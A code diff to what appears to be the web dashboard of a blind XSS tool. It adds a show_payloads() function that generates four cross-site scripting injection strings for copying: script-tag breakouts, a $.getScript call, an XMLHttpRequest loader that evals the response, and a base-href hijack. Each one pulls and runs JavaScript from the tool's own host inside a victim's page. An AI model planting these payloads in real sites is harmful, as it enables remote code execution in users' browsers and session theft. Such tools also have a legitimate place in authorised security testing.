@@ -78,7 +78,6 @@ $(function(){
 		$.each(triggers, function(_, trigger){
 			var $row = $('<tr></tr>');
 			$.each(fields, function(key, field) {
-				console.log(trigger[key], )
 				var $td = $('<td style="vertical-align:middle"></td>');
 				if('special' in field) $td.html(field.special(trigger));
 				else $td.text(trigger[key]);
@@ -96,3 +95,19 @@ $(function(){
 	});
 	$table.prepend($('<thead style="text-align:center"></thead>').append($rowhead));
 });
+
+function show_payloads(){
+	var domain = document.domain;
+	var payloads = [
+		'"><script src="https://' + domain + '"></script>',
+		'<script>$.getScript("//' + domain + '")</script>',
+		'<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + domain + '");a.send();</script>',
+		'"><base href="//' + domain + '"><script src="./"></script>'
+	];
+	var div = $('<div>');
+	for (var i = 0; i < payloads.length; ++i) div.append($('<input class="form-control" readonly>').val(payloads[i])).append('<br>');
+	Swal.fire({
+		title: 'Payloads',
+		html: div
+	});
+}
